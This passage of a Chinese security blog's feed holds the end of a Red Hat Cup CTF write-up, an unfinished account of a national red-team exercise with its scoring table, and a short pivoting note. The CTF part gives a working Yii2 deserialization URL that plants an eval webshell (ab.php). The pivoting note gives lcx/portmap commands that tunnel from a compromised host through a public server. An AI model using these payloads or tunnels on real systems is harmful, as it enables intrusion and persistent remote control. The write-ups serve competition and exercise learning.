punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p> 然后写入shell</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2zeekzpgsy8b4rsdmpvb.cloudeci1.ichunqiu.com&#x2F;index.php?r&#x3D;site%2Fabout&amp;message&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjI0OiJhc3NlcnQoJF9SRVFVRVNUWyJjbWQiXSkiO31pOjE7czozOiJydW4iO319fX0&#x3D;&amp;cmd&#x3D;die(file_put_contents(%27ab.php%27,%27%3C?php%20eval($_REQUEST[%22cmd%22]);?%3E%27))</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510185218.png"></p><p>得到一个ab.php的</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210510185302346.png"></p><p>使用蚁剑链接，链接后发现有个readflag 的文件，但是无法直接读取权限为003，直接使用蚁剑的disable_function插件可绕过进行交互式shell读取如下</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510185329.png"></p><p>flag{c70db8f4-5fda-4981-93ab-45b61efd6703}</p><h2 id="7-杂项-colorfulcode"><a href="#7-杂项-colorfulcode" class="headerlink" title="7 杂项-colorfulcode"></a>7 杂项-colorfulcode</h2><p>data1中的数据范围为0-19，data2中的前60字节数据与后面的数据明显不同，猜测data2中前60字节为像素信息，每3字节一个RGB像素点，则刚好20个像素点，编号为0-19，正好对应data1中的0-19数据，使用脚本将data1中的数据替换为像素点，并创建成一张图片。</p><p>data1中数据为7067字节，即一共7067个像素点，分解为宽度<em>高度只有一个结果即37</em>131（或131*37）</p><p>编写脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagea <span class="token operator">=</span> <span class="token string">'0000000000C000FFFF00FF00FFC0FFFFC0C0C0C0FFC0C000FF00FFFF0000C00000C000C0FFFFFFFFFF00FFFFC000C00000C0C0C0FFFFC0FFC00000FF'</span>px <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    px<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">191</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data1'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>str1 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>str1 <span class="token operator">=</span> str1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">191</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> px<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        num<span class="token operator">+=</span><span class="token number">1</span>pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'xxx.png'</span><span class="token punctuation">)</span></code></pre><p>执行脚本得到图片</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210512090422.png"></p><p>在线进行转换</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210512090454844.png"></p><p>得到flag</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210512090540.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全竞赛" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
    <category term="红帽杯" scheme="http://www.greetdawn.top/tags/%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>记2021全国hvv演练的点点滴滴</title>
    <link href="http://www.greetdawn.top/2021/04/25/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/hvv/2021-hvv-country/"/>
    <id>http://www.greetdawn.top/2021/04/25/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/hvv/2021-hvv-country/</id>
    <published>2021-04-25T06:25:51.000Z</published>
    <updated>2021-04-29T11:59:17.127Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>2021年的全国hvv演练比以往来的稍微早了一些，由于网络安全在国家战略层面的显著提升，各类网安行动如火如荼，一股强烈的网安之风吹遍了整个中华大地。全国演练活动已经开展了几次，相比于往年来说，整个网络安全环境带来了显著提升和优化，这就意味着演练目标变的越来越难打。</p><p>本人有幸代表公安厅参与了此次2021年全国攻防演练的活动，此次活动历经18天左右，在公安部的严密部署下紧张有序的进行着。本人也是首次参加此类规模的攻防演练活动，整个参演团队也都第一次。大家的经验都不是太丰富，其次大家也都是抱着体验，交流，成长的目的来参与此次的攻防演练活动的。但是在最终成绩这一块还是比较满意。整个过程还是比较紧张刺激且富有挑战性的，这里想着花点时间详细整理一下此次攻防过程中的典型细节以及相关感悟，这边主要偏向于一些思路的展开讲解，不过多纠结于技术细节。对于许多的大佬来说，技术其实都是常见技术点，并没有太多的花头。而且就我此次的演练感悟来看，思路是决定最终成绩好坏的最关键因素。就想最终的APT攻击一样，最大程度上利用的人性本身的弱点。在此次的攻防演练中，也是如此。这边本人已将相应的敏感信息进行脱敏处理，并且不进行广泛传播。</p><h2 id="二、过程"><a href="#二、过程" class="headerlink" title="二、过程"></a>二、过程</h2><h3 id="1-评分机制"><a href="#1-评分机制" class="headerlink" title="1 评分机制"></a>1 评分机制</h3><p>国家级攻防演练和省地市演练有所不同，主要收录和参与评分的漏洞主要为系统级权限漏洞，对于一般性不可利用的低危漏洞并不参与计分处理。并且可对内网资产进行渗透。涉及的相关评分机制主要如下:</p><table><thead><tr><th align="center">类型</th><th align="center">评分</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">参演单位域名控制权限</td><td align="center">一级100、二级50</td><td align="center">单个参演单位得分上限500</td></tr><tr><td align="center">获取pc、移动端权限</td><td align="center">pc：20/台、移动端：50/台</td><td align="center">得分上线500、且pc权限必须为system、root</td></tr><tr><td align="center">获取邮箱权限</td><td align="center">邮箱账号口令：20、系统管理员权限：500-1000</td><td align="center"></td></tr><tr><td align="center">办公自动化系统权限</td><td align="center">200-500</td><td align="center">OA、即时通讯、项目管理、财务系统管理员权限</td></tr><tr><td align="center">身份、账户管理平台权限（SSO、4A）</td><td align="center">系统管理权限300、能登陆的系统100</td><td align="center"></td></tr><tr><td align="center">域控系统权限</td><td align="center">管理员200、域内可控服务器10/台</td><td align="center">上限4000</td></tr><tr><td align="center">堡垒机、运维机权限</td><td align="center">管理员200、托管的服务器10/台</td><td align="center">上限4000</td></tr><tr><td align="center">获取大数据系统权限</td><td align="center"></td><td align="center">根据数据量和重要程度给分，上限3000</td></tr><tr><td align="center">获取数据库连接账号密码</td><td align="center">普通50、管理员100</td><td align="center">上限1000</td></tr><tr><td align="center">获取网络设备权限</td><td align="center">网络等级给分，大型300</td><td align="center">需提供路由表及连接量上限2000</td></tr><tr><td align="center">获取工业互联网系统权限</td><td align="center"></td><td align="center">指挥部研判给分</td></tr><tr><td align="center">物联网设备管控平台权限</td><td align="center">控制功能的平台200、连接数5/台</td><td align="center">上限1000</td></tr><tr><td align="center">安全设备权限</td><td align="center">普通50、管理员200</td><td align="center">ids、审计、waf上限1000</td></tr><tr><td align="center">一般web应用、ftp权限</td><td align="center">普通20、管理员100</td><td align="center"></td></tr><tr><td align="center">获取服务器主权限</td><td align="center">普通50、管理员100</td><td align="center"></td></tr><tr><td align="center">突破网络边界</td><td align="center">上限8000</td><td align="center"></td></tr><tr><td align="center">进入逻辑隔离业务内网</td><td align="center">1000</td><td align="center">需提供防火墙vpn网络设备控制截图</td></tr><tr><td align="center">核心生产网</td><td align="center">10000</td><td align="center">铁路调度、银行核心、电力生产等</td></tr><tr><td align="center">发现已植入webshell木马、主机木马</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">发现黑客破解登录主机系统</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">发现主机异常新增账号</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">发现隐蔽控制通道</td><td align="center">100-500</td><td align="center"></td></tr><tr><td align="center">提交0day或未被正式公开N-day</td><td align="center">0-10000</td><td align="center"></td></tr></tbody></table><h3 id="2-报告审核"><a href="#2-报告审核" class="headerlink" title="2 报告审核"></a>2 报告审核</h3><p>提交报告时，有专门的虚拟化软件平台，在此平台内进行报告提交。提交报告不仅要包含完整的攻击文档，且须对整个完整的攻击利用链进行梳理，形成完整的攻击流程图，且对获取的对应资产数量及权限进行逐一填写。反正整个报告的提交流程较为复杂。</p><h3 id="3-资产靶标"><a href="#3-资产靶标" class="headerlink" title="3 资产靶标"></a>3 资产靶标</h3><p>提供的资产靶标主要为内网资产，且我们获取的资产系统主要为国家级政府门户网站及其内网核心系统。</p><p>靶标不会提供具体的ip地址以及对应的url，需要在互联网收集对应靶标的系统入口及可能互联的系统环境及其网站。这样就会</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;2021年的全国hvv演练比以往来的稍微早了一些，由于网络安全在国家战略层</summary>
      
    
    
    
    <category term="攻防渗透" scheme="http://www.greetdawn.top/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="护网演练" scheme="http://www.greetdawn.top/tags/%E6%8A%A4%E7%BD%91%E6%BC%94%E7%BB%83/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之端口转发</title>
    <link href="http://www.greetdawn.top/2021/03/25/web-security/security-transform-port/"/>
    <id>http://www.greetdawn.top/2021/03/25/web-security/security-transform-port/</id>
    <published>2021-03-25T02:05:26.000Z</published>
    <updated>2021-03-26T01:04:34.164Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/fog.jpg" alt="fog"></p><span id="more"></span><h1 id="lcx-端口转发应用"><a href="#lcx-端口转发应用" class="headerlink" title="lcx 端口转发应用"></a>lcx 端口转发应用</h1><h2 id="公网服务器开启端口监听"><a href="#公网服务器开启端口监听" class="headerlink" title="公网服务器开启端口监听"></a>公网服务器开启端口监听</h2><p><code>./portmap -m 2 -p1 3950 -h2 公网服务器IP -p2 3951</code></p><p>备注：</p><p>1 这里的3950端口和3951端口在公网IP上都是打开的</p><p>2 命令含义是将公网服务器监听的3950端口接收的数据转发至公网ip的3951端口</p><h2 id="被控制主机转发端口"><a href="#被控制主机转发端口" class="headerlink" title="被控制主机转发端口"></a>被控制主机转发端口</h2><p><code>lcx.exe -slave 公网服务器ip 3950 127.0.0.1</code></p><h2 id="同网段互通主机开启监听"><a href="#同网段互通主机开启监听" class="headerlink" title="同网段互通主机开启监听"></a>同网段互通主机开启监听</h2><p><code>Lcx.exe -listen 51 8888</code></p><p>监听本地的51端口将其转发到8888</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/fog.jpg&quot; alt=&quot;fog&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="http://www.greetdawn.top/categories/Security/"/>
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="端口转发" scheme="http://www.greetdawn.top/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
</feed>
